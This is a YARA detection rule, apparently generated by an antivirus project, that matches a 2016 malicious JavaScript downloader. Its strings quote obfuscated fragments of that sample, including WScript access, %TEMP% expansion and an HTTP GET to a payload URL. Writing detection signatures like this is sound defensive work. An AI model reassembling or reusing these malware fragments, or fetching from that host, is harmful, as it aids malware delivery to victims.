rule sig_20160428_828763d427eb364f0e23a3fae9edc9a0 {
  meta:
    description = "datamaliciousorder - file 20160428_828763d427eb364f0e23a3fae9edc9a0.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8fccf66d6389da89dca7d5f3105c16b23ab9a350250f90510425472578c9ed0d"

  strings:
    $s1  = "function LviSkdKuqWddTscRgqEhw(OqrKgsUchZpqLumVvdWba){DxyAjkOjfFifKqfJqrLzl[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function QgnExqPskCjhDlxTzxKyr(TzeFrpMgcZyuImtQrbNum, PujKryLxuNphVfeBknGzw){NchGmjBqxKwaJqtAhuRun = NchGmjBqxKwaJqtAhuRun * 1; " ascii
    $s3  = "function YbuEkvPseDwuAjsUcqTjm() {return DxyAjkOjfFifKqfJqrLzl[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function LviSkdKuqWddTscRgqEhw(OqrKgsUchZpqLumVvdWba){DxyAjkOjfFifKqfJqrLzl[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "var DxyAjkOjfFifKqfJqrLzl = function NbpNhnYjjPhiZprIeqZna() {return HzjAzfKomPqoMqhNakEjb[YxvVvcKjqHakAorSudSpe](\"WScript\"+\"" ascii
    $s6  = "return TzeFrpMgcZyuImtQrbNum - PujKryLxuNphVfeBknGzw;};" fullword ascii
    $s7  = "XzvNlwUzpUpkXvgXrcRaz[MmrPcwZonAumHucQthGyw](\"G\" + \"ET\", \"http://test.barbasov.ru/z0olqa\", false);" fullword ascii
    $s8  = "function QgnExqPskCjhDlxTzxKyr(TzeFrpMgcZyuImtQrbNum, PujKryLxuNphVfeBknGzw){NchGmjBqxKwaJqtAhuRun = NchGmjBqxKwaJqtAhuRun * 1; " ascii
    $s9  = "function NpaXvlCuhCezFuyBuiRib() {return ((RvhPjoKgyKoxWluSgaSex == true) && (RvhPjoKgyKoxWluSgaSex == VxnNtrCgwVmuMcoSgvLzg)) ?" ascii
    $s10 = "var HzjAzfKomPqoMqhNakEjb = this[\"WScript\"];" fullword ascii
    $s11 = "var DxyAjkOjfFifKqfJqrLzl = function NbpNhnYjjPhiZprIeqZna() {return HzjAzfKomPqoMqhNakEjb[YxvVvcKjqHakAorSudSpe](\"WScript\"+\"" ascii
    $s12 = "function YbuEkvPseDwuAjsUcqTjm() {return DxyAjkOjfFifKqfJqrLzl[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s13 = "if (XzvNlwUzpUpkXvgXrcRaz[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function UajRliGhpJjwKreZgkNik(){return BsnSmfCbfYjjPbrChaGxs + \"\";};" fullword ascii
    $s15 = "function NpaXvlCuhCezFuyBuiRib() {return ((RvhPjoKgyKoxWluSgaSex == true) && (RvhPjoKgyKoxWluSgaSex == VxnNtrCgwVmuMcoSgvLzg)) ?" ascii
    $s16 = "function GnjItgAfrJxkRetTpyKrq()" fullword ascii
    $s17 = "function QtyZduXpkJwvTwjPjcPwy(IvfCreXttRhxVpeNatKdb) {var HhtBuuFeyYymMklOkeZyd = (1, 2, 3, 4, 5, IvfCreXttRhxVpeNatKdb); retur" ascii
    $s18 = "function QtyZduXpkJwvTwjPjcPwy(IvfCreXttRhxVpeNatKdb) {var HhtBuuFeyYymMklOkeZyd = (1, 2, 3, 4, 5, IvfCreXttRhxVpeNatKdb); retur" ascii
    $s19 = "var KeoNkgOpeEymQxqFfsPss = new this[\"D\"+\"ate\"]();" fullword ascii
    $s20 = "YytNgbDpzScdLrdJjiLar = true;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}